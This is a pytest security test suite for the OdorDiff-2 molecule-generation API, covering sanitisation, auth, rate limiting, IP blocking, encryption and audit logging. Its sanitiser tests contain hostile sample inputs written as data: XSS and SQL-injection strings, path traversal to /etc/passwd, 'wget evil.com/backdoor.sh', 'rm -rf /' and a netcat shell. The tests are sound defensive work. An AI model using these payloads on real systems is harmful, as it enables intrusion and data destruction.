"""
Comprehensive security testing suite for OdorDiff-2.
"""

import pytest
import asyncio
import time
import json
import hashlib
import hmac
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime, timedelta
import requests_mock
import jwt

from odordiff2.utils.security import (
    SecurityValidator,
    InputSanitizer,
    AuthenticationManager,
    RateLimitManager,
    SecurityAuditor,
    IPBlockingManager,
    EncryptionManager
)
from odordiff2.utils.validation import InputValidator
from odordiff2.api.secure_endpoints import SecureAPIEndpoints


class TestInputSanitization:
    """Test input sanitization and validation."""
    
    @pytest.fixture
    def sanitizer(self):
        """Create input sanitizer instance."""
        return InputSanitizer()
    
    def test_xss_prevention(self, sanitizer):
        """Test XSS attack prevention."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';DROP TABLE users;--",
            "<svg onload=alert('xss')>",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for malicious in malicious_inputs:
            sanitized = sanitizer.sanitize_html(malicious)
            
            # Should not contain script tags or javascript
            assert "<script>" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
            assert "onload=" not in sanitized.lower()
    
    def test_sql_injection_prevention(self, sanitizer):
        """Test SQL injection attack prevention."""
        sql_injection_attempts = [
            "'; DROP TABLE molecules; --",
            "1' OR '1'='1",
            "'; SELECT * FROM users; --",
            "admin'--",
            "' UNION SELECT password FROM users--",
            "'; INSERT INTO molecules VALUES ('evil'); --"
        ]
        
        for injection in sql_injection_attempts:
            sanitized = sanitizer.sanitize_sql_string(injection)
            
            # Should escape or remove dangerous SQL patterns
            assert "DROP TABLE" not in sanitized.upper()
            assert "UNION SELECT" not in sanitized.upper()
            assert "INSERT INTO" not in sanitized.upper()
            assert "'--" not in sanitized
    
    def test_path_traversal_prevention(self, sanitizer):
        """Test path traversal attack prevention."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for path in path_traversal_attempts:
            sanitized = sanitizer.sanitize_path(path)
            
            # Should not contain path traversal patterns
            assert "../" not in sanitized
            assert "..\\" not in sanitized
            assert "%2e%2e" not in sanitized.lower()
            assert "etc/passwd" not in sanitized.lower()
    
    def test_command_injection_prevention(self, sanitizer):
        """Test command injection prevention."""
        command_injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget evil.com/backdoor.sh",
            "`curl evil.com`",
            "$(wget evil.com)",
            "; nc -l -p 1234 -e /bin/sh"
        ]
        
        for cmd in command_injection_attempts:
            sanitized = sanitizer.sanitize_command(cmd)
            
            # Should remove or escape dangerous command patterns
            assert "rm -rf" not in sanitized
            assert "cat /etc/passwd" not in sanitized
            assert "wget" not in sanitized
            assert "curl" not in sanitized
            assert "nc -l" not in sanitized
    
    def test_molecule_smiles_validation(self, sanitizer):
        """Test SMILES string validation for molecular input."""
        valid_smiles = [
            "CCO",  # Ethanol
            "CC(C)O",  # Isopropanol
            "c1ccccc1",  # Benzene
            "CC(=O)O",  # Acetic acid
            "CN(C)C(=O)c1ccccc1"  # N,N-dimethylbenzamide
        ]
        
        invalid_smiles = [
            "'; DROP TABLE molecules; --",
            "<script>alert('xss')</script>",
            "CC(C)O AND 1=1",
            "../../etc/passwd",
            "exec('rm -rf /')"
        ]
        
        for valid in valid_smiles:
            result = sanitizer.validate_smiles(valid)
            assert result.is_valid
            assert result.sanitized_smiles is not None
        
        for invalid in invalid_smiles:
            result = sanitizer.validate_smiles(invalid)
            assert not result.is_valid or result.sanitized_smiles != invalid


class TestAuthentication:
    """Test authentication and authorization mechanisms."""
    
    @pytest.fixture
    def auth_manager(self):
        """Create authentication manager."""
        return AuthenticationManager(
            secret_key="test_secret_key_1234567890",
            token_expiry_hours=24
        )
    
    def test_api_key_generation(self, auth_manager):
        """Test API key generation."""
        api_key = auth_manager.generate_api_key("test_user")
        
        assert isinstance(api_key, str)
        assert len(api_key) >= 32  # Should be sufficiently long
        assert api_key.isalnum() or all(c in api_key for c in "abcdef0123456789")
    
    def test_api_key_validation(self, auth_manager):
        """Test API key validation."""
        user_id = "test_user"
        api_key = auth_manager.generate_api_key(user_id)
        
        # Valid API key should pass
        validation_result = auth_manager.validate_api_key(api_key)
        assert validation_result.is_valid
        assert validation_result.user_id == user_id
        
        # Invalid API key should fail
        invalid_result = auth_manager.validate_api_key("invalid_key_123")
        assert not invalid_result.is_valid
        assert invalid_result.user_id is None
    
    def test_jwt_token_creation(self, auth_manager):
        """Test JWT token creation and validation."""
        payload = {
            "user_id": "test_user",
            "permissions": ["generate_molecules", "view_data"],
            "rate_limit": 100
        }
        
        token = auth_manager.create_jwt_token(payload)
        assert isinstance(token, str)
        assert len(token.split('.')) == 3  # JWT has 3 parts
        
        # Validate token
        decoded = auth_manager.validate_jwt_token(token)
        assert decoded["user_id"] == "test_user"
        assert "generate_molecules" in decoded["permissions"]
    
    def test_jwt_token_expiry(self, auth_manager):
        """Test JWT token expiry handling."""
        # Create token with short expiry
        auth_manager.token_expiry_hours = 0.001  # ~3.6 seconds
        
        payload = {"user_id": "test_user"}
        token = auth_manager.create_jwt_token(payload)
        
        # Token should be valid initially
        assert auth_manager.validate_jwt_token(token) is not None
        
        # Wait for expiry
        time.sleep(4)
        
        # Token should be expired
        with pytest.raises(jwt.ExpiredSignatureError):
            auth_manager.validate_jwt_token(token)
    
    def test_permission_checking(self, auth_manager):
        """Test permission-based access control."""
        # User with limited permissions
        limited_token = auth_manager.create_jwt_token({
            "user_id": "limited_user",
            "permissions": ["view_data"]
        })
        
        # User with full permissions
        admin_token = auth_manager.create_jwt_token({
            "user_id": "admin_user", 
            "permissions": ["view_data", "generate_molecules", "admin_access"]
        })
        
        # Test permission checking
        limited_decoded = auth_manager.validate_jwt_token(limited_token)
        admin_decoded = auth_manager.validate_jwt_token(admin_token)
        
        assert auth_manager.has_permission(limited_decoded, "view_data")
        assert not auth_manager.has_permission(limited_decoded, "generate_molecules")
        assert not auth_manager.has_permission(limited_decoded, "admin_access")
        
        assert auth_manager.has_permission(admin_decoded, "view_data")
        assert auth_manager.has_permission(admin_decoded, "generate_molecules")
        assert auth_manager.has_permission(admin_decoded, "admin_access")


class TestRateLimiting:
    """Test rate limiting mechanisms."""
    
    @pytest.fixture
    def rate_limiter(self):
        """Create rate limiter instance."""
        return RateLimitManager({
            "default": {"requests": 100, "window": 3600},  # 100 requests per hour
            "premium": {"requests": 1000, "window": 3600},  # 1000 requests per hour
            "burst": {"requests": 10, "window": 60}  # 10 requests per minute
        })
    
    def test_basic_rate_limiting(self, rate_limiter):
        """Test basic rate limiting functionality."""
        client_id = "test_client_123"
        
        # Should allow requests under limit
        for i in range(5):
            result = rate_limiter.check_rate_limit(client_id, "default")
            assert result.allowed
            assert result.remaining > 0
        
        assert rate_limiter.get_request_count(client_id, "default") == 5
    
    def test_rate_limit_exceeded(self, rate_limiter):
        """Test behavior when rate limit is exceeded."""
        client_id = "heavy_client"
        
        # Simulate exceeding rate limit
        for i in range(101):  # Exceed the 100 request limit
            result = rate_limiter.check_rate_limit(client_id, "default")
            
            if i < 100:
                assert result.allowed
            else:
                assert not result.allowed
                assert result.retry_after > 0
    
    def test_rate_limit_window_reset(self, rate_limiter):
        """Test rate limit window reset."""
        # Create rate limiter with short window for testing
        short_limiter = RateLimitManager({
            "test": {"requests": 3, "window": 2}  # 3 requests per 2 seconds
        })
        
        client_id = "test_reset_client"
        
        # Use up the rate limit
        for i in range(3):
            result = short_limiter.check_rate_limit(client_id, "test")
            assert result.allowed
        
        # Should be rate limited
        result = short_limiter.check_rate_limit(client_id, "test")
        assert not result.allowed
        
        # Wait for window to reset
        time.sleep(3)
        
        # Should be allowed again
        result = short_limiter.check_rate_limit(client_id, "test")
        assert result.allowed
    
    def test_different_rate_limit_tiers(self, rate_limiter):
        """Test different rate limit tiers."""
        client_id = "tier_test_client"
        
        # Test default tier
        for i in range(10):
            result = rate_limiter.check_rate_limit(client_id, "default")
            assert result.allowed
        
        # Test premium tier (higher limit)
        for i in range(50):
            result = rate_limiter.check_rate_limit(client_id, "premium")
            assert result.allowed
        
        # Test burst tier (lower limit, shorter window)
        for i in range(8):
            result = rate_limiter.check_rate_limit(client_id, "burst")
            assert result.allowed
    
    def test_ip_based_rate_limiting(self, rate_limiter):
        """Test IP-based rate limiting."""
        ip_address = "192.168.1.100"
        
        # Test rate limiting by IP
        for i in range(5):
            result = rate_limiter.check_rate_limit_by_ip(ip_address, "default")
            assert result.allowed
        
        # Different IPs should have separate limits
        other_ip = "192.168.1.101"
        for i in range(5):
            result = rate_limiter.check_rate_limit_by_ip(other_ip, "default")
            assert result.allowed
    
    def test_distributed_rate_limiting(self, rate_limiter):
        """Test distributed rate limiting with Redis backend."""
        with patch('redis.Redis') as mock_redis:
            mock_client = Mock()
            mock_redis.return_value = mock_client
            mock_client.get.return_value = b'5'  # 5 requests already made
            mock_client.incr.return_value = 6
            mock_client.expire.return_value = True
            
            # Configure rate limiter to use Redis
            rate_limiter.use_redis_backend(mock_client)
            
            client_id = "distributed_client"
            result = rate_limiter.check_rate_limit(client_id, "default")
            
            assert result.allowed
            assert result.remaining == 94  # 100 - 6
            
            # Verify Redis operations
            mock_client.incr.assert_called()
            mock_client.expire.assert_called()


class TestIPBlocking:
    """Test IP blocking and threat detection."""
    
    @pytest.fixture
    def ip_blocker(self):
        """Create IP blocking manager."""
        return IPBlockingManager({
            "max_requests_per_minute": 60,
            "max_failed_attempts": 5,
            "block_duration_hours": 24,
            "suspicious_patterns": [
                "curl/",
                "python-requests/",
                "sqlmap/",
                "nmap"
            ]
        })
    
    def test_suspicious_activity_detection(self, ip_blocker):
        """Test detection of suspicious activity patterns."""
        suspicious_ip = "10.0.0.1"
        
        # Simulate suspicious user agents
        suspicious_agents = [
            "curl/7.68.0",
            "python-requests/2.25.1",
            "sqlmap/1.5.2",
            "nmap scripting engine"
        ]
        
        for agent in suspicious_agents:
            ip_blocker.record_request(suspicious_ip, user_agent=agent)
        
        assert ip_blocker.is_suspicious_activity(suspicious_ip)
        assert ip_blocker.should_block_ip(suspicious_ip)
    
    def test_failed_attempt_tracking(self, ip_blocker):
        """Test tracking of failed authentication attempts."""
        malicious_ip = "10.0.0.2"
        
        # Record failed attempts
        for i in range(3):
            ip_blocker.record_failed_attempt(malicious_ip, "invalid_credentials")
        
        assert not ip_blocker.should_block_ip(malicious_ip)  # Below threshold
        
        # Record more failed attempts
        for i in range(3):
            ip_blocker.record_failed_attempt(malicious_ip, "brute_force")
        
        assert ip_blocker.should_block_ip(malicious_ip)  # Above threshold
    
    def test_rate_based_blocking(self, ip_blocker):
        """Test blocking based on request rate."""
        rapid_ip = "10.0.0.3"
        
        # Simulate rapid requests
        start_time = time.time()
        for i in range(120):  # 120 requests (above 60/minute limit)
            ip_blocker.record_request(rapid_ip, timestamp=start_time + i)
        
        assert ip_blocker.is_rate_limited(rapid_ip)
        assert ip_blocker.should_block_ip(rapid_ip)
    
    def test_ip_whitelist(self, ip_blocker):
        """Test IP whitelist functionality."""
        whitelisted_ips = ["127.0.0.1", "::1", "10.0.0.0/8"]
        ip_blocker.set_whitelist(whitelisted_ips)
        
        # Whitelist IPs should never be blocked
        for ip in ["127.0.0.1", "10.0.0.100"]:
            # Simulate suspicious activity
            for i in range(10):
                ip_blocker.record_failed_attempt(ip, "brute_force")
            
            assert not ip_blocker.should_block_ip(ip)
    
    def test_ip_block_expiry(self, ip_blocker):
        """Test IP block expiration."""
        # Configure short block duration for testing
        ip_blocker.block_duration_hours = 0.001  # ~3.6 seconds
        
        blocked_ip = "10.0.0.4"
        
        # Trigger blocking
        for i in range(6):
            ip_blocker.record_failed_attempt(blocked_ip, "brute_force")
        
        assert ip_blocker.should_block_ip(blocked_ip)
        
        # Wait for block to expire
        time.sleep(4)
        
        assert not ip_blocker.should_block_ip(blocked_ip)
    
    def test_geolocation_blocking(self, ip_blocker):
        """Test geolocation-based blocking."""
        with patch('requests.get') as mock_get:
            # Mock geolocation API response
            mock_response = Mock()
            mock_response.json.return_value = {
                "country": "CN",
                "region": "Beijing",
                "org": "Suspicious ISP"
            }
            mock_get.return_value = mock_response
            
            # Configure blocked countries
            ip_blocker.set_blocked_countries(["CN", "RU", "KP"])
            
            suspicious_ip = "1.2.3.4"
            location_info = ip_blocker.get_ip_location(suspicious_ip)
            
            assert location_info["country"] == "CN"
            assert ip_blocker.is_blocked_country(location_info["country"])
            assert ip_blocker.should_block_ip_by_location(suspicious_ip)


class TestEncryption:
    """Test encryption and data protection."""
    
    @pytest.fixture
    def encryption_manager(self):
        """Create encryption manager."""
        return EncryptionManager(
            secret_key="test_encryption_key_1234567890abcdef",
            algorithm="AES-256-GCM"
        )
    
    def test_symmetric_encryption(self, encryption_manager):
        """Test symmetric encryption/decryption."""
        plaintext = "This is sensitive molecule data: CC(=O)O"
        
        # Encrypt data
        encrypted = encryption_manager.encrypt(plaintext)
        assert encrypted != plaintext
        assert isinstance(encrypted, str)
        
        # Decrypt data
        decrypted = encryption_manager.decrypt(encrypted)
        assert decrypted == plaintext
    
    def test_encryption_with_authentication(self, encryption_manager):
        """Test authenticated encryption."""
        sensitive_data = {
            "user_id": "researcher_001",
            "molecule_smiles": "CN(C)C(=O)c1ccccc1",
            "safety_score": 0.92,
            "timestamp": datetime.now().isoformat()
        }
        
        # Encrypt with authentication
        encrypted_data = encryption_manager.encrypt_authenticated(
            json.dumps(sensitive_data)
        )
        
        # Decrypt and verify authenticity
        decrypted_json = encryption_manager.decrypt_authenticated(encrypted_data)
        decrypted_data = json.loads(decrypted_json)
        
        assert decrypted_data["user_id"] == "researcher_001"
        assert decrypted_data["molecule_smiles"] == "CN(C)C(=O)c1ccccc1"
    
    def test_encryption_tampering_detection(self, encryption_manager):
        """Test detection of encrypted data tampering."""
        plaintext = "Important molecular data"
        encrypted = encryption_manager.encrypt_authenticated(plaintext)
        
        # Tamper with encrypted data
        tampered = encrypted[:-10] + "tampered123"
        
        # Should raise exception for tampered data
        with pytest.raises(Exception):  # Authentication failure
            encryption_manager.decrypt_authenticated(tampered)
    
    def test_password_hashing(self, encryption_manager):
        """Test secure password hashing."""
        password = "user_password_123"
        
        # Hash password
        hashed = encryption_manager.hash_password(password)
        assert hashed != password
        assert len(hashed) > 50  # Should be significantly longer
        
        # Verify password
        assert encryption_manager.verify_password(password, hashed)
        assert not encryption_manager.verify_password("wrong_password", hashed)
    
    def test_api_key_encryption(self, encryption_manager):
        """Test API key encryption storage."""
        api_key = "ak_1234567890abcdef"
        user_id = "researcher_001"
        
        # Encrypt API key for storage
        encrypted_key = encryption_manager.encrypt_api_key(api_key, user_id)
        assert encrypted_key != api_key
        
        # Decrypt API key
        decrypted_key = encryption_manager.decrypt_api_key(encrypted_key, user_id)
        assert decrypted_key == api_key


class TestSecurityAuditing:
    """Test security auditing and logging."""
    
    @pytest.fixture
    def auditor(self):
        """Create security auditor."""
        return SecurityAuditor(
            log_level="INFO",
            audit_file="/tmp/security_audit.log",
            alert_webhook="https://hooks.slack.com/test"
        )
    
    def test_security_event_logging(self, auditor):
        """Test security event logging."""
        # Log various security events
        events = [
            {
                "event_type": "authentication_failure",
                "ip_address": "192.168.1.100",
                "user_agent": "curl/7.68.0",
                "details": "Invalid API key"
            },
            {
                "event_type": "rate_limit_exceeded",
                "ip_address": "10.0.0.1",
                "requests_count": 150,
                "time_window": 3600
            },
            {
                "event_type": "suspicious_input",
                "ip_address": "172.16.0.1",
                "input_data": "'; DROP TABLE molecules; --",
                "sanitized_data": "'; DROP TABLE molecules; --"
            }
        ]
        
        for event in events:
            auditor.log_security_event(event)
        
        # Verify events were logged
        audit_logs = auditor.get_recent_events(limit=10)
        assert len(audit_logs) >= 3
        
        event_types = [log["event_type"] for log in audit_logs]
        assert "authentication_failure" in event_types
        assert "rate_limit_exceeded" in event_types
        assert "suspicious_input" in event_types
    
    def test_threat_pattern_detection(self, auditor):
        """Test automated threat pattern detection."""
        # Simulate potential attack pattern
        attack_events = [
            {"event_type": "authentication_failure", "ip_address": "1.2.3.4", "timestamp": time.time()},
            {"event_type": "authentication_failure", "ip_address": "1.2.3.4", "timestamp": time.time() + 1},
            {"event_type": "authentication_failure", "ip_address": "1.2.3.4", "timestamp": time.time() + 2},
            {"event_type": "suspicious_input", "ip_address": "1.2.3.4", "timestamp": time.time() + 3},
            {"event_type": "rate_limit_exceeded", "ip_address": "1.2.3.4", "timestamp": time.time() + 4}
        ]
        
        for event in attack_events:
            auditor.log_security_event(event)
        
        # Analyze for attack patterns
        threats = auditor.detect_threat_patterns()
        
        assert len(threats) > 0
        assert any(threat["ip_address"] == "1.2.3.4" for threat in threats)
        assert any(threat["threat_type"] == "brute_force_attack" for threat in threats)
    
    @patch('requests.post')
    def test_security_alerting(self, mock_post, auditor):
        """Test security alert notifications."""
        mock_post.return_value = Mock(status_code=200)
        
        critical_event = {
            "event_type": "potential_breach",
            "severity": "CRITICAL",
            "ip_address": "1.2.3.4",
            "details": "Multiple security violations detected",
            "timestamp": datetime.now().isoformat()
        }
        
        # Log critical event (should trigger alert)
        auditor.log_security_event(critical_event, send_alert=True)
        
        # Verify webhook was called
        mock_post.assert_called_once()
        call_args = mock_post.call_args
        assert "https://hooks.slack.com/test" in str(call_args)
    
    def test_compliance_reporting(self, auditor):
        """Test compliance reporting capabilities."""
        # Log events for compliance testing
        compliance_events = [
            {
                "event_type": "data_access",
                "user_id": "researcher_001",
                "data_type": "molecular_structures",
                "action": "download",
                "ip_address": "10.0.0.1"
            },
            {
                "event_type": "data_modification",
                "user_id": "admin_001", 
                "data_type": "safety_profiles",
                "action": "update",
                "ip_address": "10.0.0.2"
            }
        ]
        
        for event in compliance_events:
            auditor.log_security_event(event)
        
        # Generate compliance report
        report = auditor.generate_compliance_report(
            start_date=datetime.now() - timedelta(days=1),
            end_date=datetime.now()
        )
        
        assert "data_access_events" in report
        assert "data_modification_events" in report
        assert report["total_events"] >= 2
        assert len(report["unique_users"]) >= 2


class TestSecureAPIEndpoints:
    """Test secure API endpoint implementations."""
    
    @pytest.fixture
    def secure_api(self):
        """Create secure API endpoints instance."""
        return SecureAPIEndpoints(
            auth_required=True,
            rate_limiting=True,
            input_validation=True
        )
    
    @pytest.mark.asyncio
    async def test_authenticated_endpoint(self, secure_api):
        """Test authenticated endpoint access."""
        with patch('odordiff2.utils.security.AuthenticationManager') as mock_auth:
            mock_auth_instance = Mock()
            mock_auth.return_value = mock_auth_instance
            
            # Mock valid authentication
            mock_auth_instance.validate_jwt_token.return_value = {
                "user_id": "test_user",
                "permissions": ["generate_molecules"]
            }
            
            # Mock request with valid token
            mock_request = Mock()
            mock_request.headers = {"Authorization": "Bearer valid_token"}
            
            result = await secure_api.generate_molecule_endpoint(mock_request)
            
            assert result["status"] == "success"
            mock_auth_instance.validate_jwt_token.assert_called_once_with("valid_token")
    
    @pytest.mark.asyncio
    async def test_unauthenticated_access_blocked(self, secure_api):
        """Test that unauthenticated access is blocked."""
        mock_request = Mock()
        mock_request.headers = {}  # No authorization header
        
        with pytest.raises(Exception) as exc_info:
            await secure_api.generate_molecule_endpoint(mock_request)
        
        assert "authentication" in str(exc_info.value).lower()
    
    @pytest.mark.asyncio
    async def test_input_validation_endpoint(self, secure_api):
        """Test input validation in endpoints."""
        with patch('odordiff2.utils.security.AuthenticationManager') as mock_auth:
            mock_auth_instance = Mock()
            mock_auth.return_value = mock_auth_instance
            mock_auth_instance.validate_jwt_token.return_value = {
                "user_id": "test_user",
                "permissions": ["generate_molecules"]
            }
            
            # Test with malicious input
            mock_request = Mock()
            mock_request.headers = {"Authorization": "Bearer valid_token"}
            mock_request.json = Mock(return_value={
                "prompt": "<script>alert('xss')</script>",
                "num_molecules": "'; DROP TABLE molecules; --"
            })
            
            with pytest.raises(Exception) as exc_info:
                await secure_api.generate_molecule_endpoint(mock_request)
            
            assert "validation" in str(exc_info.value).lower()
    
    @pytest.mark.asyncio
    async def test_rate_limited_endpoint(self, secure_api):
        """Test rate limiting on endpoints."""
        with patch('odordiff2.utils.rate_limiting.RateLimitManager') as mock_rate_limit:
            mock_limiter = Mock()
            mock_rate_limit.return_value = mock_limiter
            
            # Mock rate limit exceeded
            mock_limiter.check_rate_limit.return_value = Mock(
                allowed=False,
                retry_after=3600
            )
            
            mock_request = Mock()
            mock_request.remote_addr = "192.168.1.100"
            mock_request.headers = {"Authorization": "Bearer valid_token"}
            
            with pytest.raises(Exception) as exc_info:
                await secure_api.generate_molecule_endpoint(mock_request)
            
            assert "rate limit" in str(exc_info.value).lower()


@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security components."""
    
    @pytest.mark.asyncio
    async def test_full_security_pipeline(self):
        """Test complete security pipeline integration."""
        # Initialize all security components
        sanitizer = InputSanitizer()
        auth_manager = AuthenticationManager("test_secret")
        rate_limiter = RateLimitManager({"default": {"requests": 10, "window": 60}})
        ip_blocker = IPBlockingManager({"max_failed_attempts": 3})
        auditor = SecurityAuditor()
        
        # Simulate legitimate request flow
        client_ip = "192.168.1.100"
        user_input = "Generate molecules for 'fresh citrus scent'"
        
        # 1. Rate limiting check
        rate_check = rate_limiter.check_rate_limit_by_ip(client_ip, "default")
        assert rate_check.allowed
        
        # 2. IP blocking check
        assert not ip_blocker.should_block_ip(client_ip)
        
        # 3. Input sanitization
        sanitized_input = sanitizer.sanitize_html(user_input)
        assert sanitized_input == user_input  # Should be unchanged for legitimate input
        
        # 4. Authentication
        token = auth_manager.create_jwt_token({"user_id": "test_user"})
        decoded = auth_manager.validate_jwt_token(token)
        assert decoded["user_id"] == "test_user"
        
        # 5. Security auditing
        audit_event = {
            "event_type": "api_request",
            "ip_address": client_ip,
            "user_id": decoded["user_id"],
            "endpoint": "/api/generate",
            "input_sanitized": True
        }
        auditor.log_security_event(audit_event)
        
        # Verify audit log
        recent_events = auditor.get_recent_events(limit=1)
        assert len(recent_events) == 1
        assert recent_events[0]["event_type"] == "api_request"
    
    @pytest.mark.asyncio
    async def test_attack_detection_and_response(self):
        """Test attack detection and automated response."""
        # Initialize security components
        ip_blocker = IPBlockingManager({"max_failed_attempts": 2})
        auditor = SecurityAuditor()
        
        malicious_ip = "1.2.3.4"
        
        # Simulate attack pattern
        attack_attempts = [
            {"type": "sql_injection", "input": "'; DROP TABLE molecules; --"},
            {"type": "xss_attempt", "input": "<script>alert('xss')</script>"},
            {"type": "auth_failure", "credentials": "admin/password123"}
        ]
        
        for attempt in attack_attempts:
            # Log security event
            auditor.log_security_event({
                "event_type": f"attack_{attempt['type']}",
                "ip_address": malicious_ip,
                "details": attempt
            })
            
            # Record failed attempt for IP blocking
            ip_blocker.record_failed_attempt(malicious_ip, attempt['type'])
        
        # IP should be blocked after multiple attempts
        assert ip_blocker.should_block_ip(malicious_ip)
        
        # Threat detection should identify attack pattern
        threats = auditor.detect_threat_patterns()
        assert any(threat["ip_address"] == malicious_ip for threat in threats)
    
    def test_performance_under_attack(self):
        """Test security system performance during attack."""
        import time
        
        # Initialize components
        sanitizer = InputSanitizer()
        rate_limiter = RateLimitManager({"default": {"requests": 1000, "window": 60}})
        
        malicious_inputs = [
            "'; DROP TABLE molecules; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "| cat /etc/passwd"
        ] * 250  # 1000 malicious inputs
        
        start_time = time.time()
        
        # Process all malicious inputs
        for i, malicious_input in enumerate(malicious_inputs):
            client_ip = f"192.168.1.{i % 255}"
            
            # Rate limit check
            rate_limiter.check_rate_limit_by_ip(client_ip, "default")
            
            # Input sanitization
            sanitizer.sanitize_html(malicious_input)
            sanitizer.sanitize_sql_string(malicious_input)
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        # Should process 1000 requests in reasonable time (less than 10 seconds)
        assert processing_time < 10.0
        
        # Average processing time per request should be low
        avg_time = processing_time / len(malicious_inputs)
        assert avg_time < 0.01  # Less than 10ms per request


@pytest.mark.performance
class TestSecurityPerformance:
    """Test security system performance characteristics."""
    
    def test_sanitization_performance(self):
        """Test input sanitization performance."""
        sanitizer = InputSanitizer()
        
        # Large input with multiple potential threats
        large_input = """
        <script>alert('xss')</script>
        '; DROP TABLE molecules; --
        ../../../etc/passwd
        | rm -rf /
        """ * 1000
        
        start_time = time.time()
        
        # Sanitize large input
        sanitized = sanitizer.sanitize_html(large_input)
        
        end_time = time.time()
        
        # Should complete in reasonable time
        assert (end_time - start_time) < 1.0  # Less than 1 second
        assert len(sanitized) > 0
    
    def test_rate_limiting_performance(self):
        """Test rate limiting performance with high concurrency."""
        rate_limiter = RateLimitManager({
            "test": {"requests": 10000, "window": 3600}
        })
        
        start_time = time.time()
        
        # Simulate 10,000 rate limit checks
        for i in range(10000):
            client_id = f"client_{i % 1000}"
            result = rate_limiter.check_rate_limit(client_id, "test")
            assert result.allowed or not result.allowed  # Just verify it returns something
        
        end_time = time.time()
        
        # Should handle high load efficiently
        assert (end_time - start_time) < 5.0  # Less than 5 seconds for 10k checks
    
    def test_encryption_performance(self):
        """Test encryption/decryption performance."""
        encryption_manager = EncryptionManager("test_key_1234567890")
        
        # Test data of various sizes
        test_sizes = [100, 1000, 10000, 100000]  # bytes
        
        for size in test_sizes:
            data = "x" * size
            
            start_time = time.time()
            
            # Encrypt
            encrypted = encryption_manager.encrypt(data)
            
            # Decrypt
            decrypted = encryption_manager.decrypt(encrypted)
            
            end_time = time.time()
            
            # Verify correctness
            assert decrypted == data
            
            # Performance should scale reasonably
            time_per_byte = (end_time - start_time) / size
            assert time_per_byte < 0.001  # Less than 1ms per KB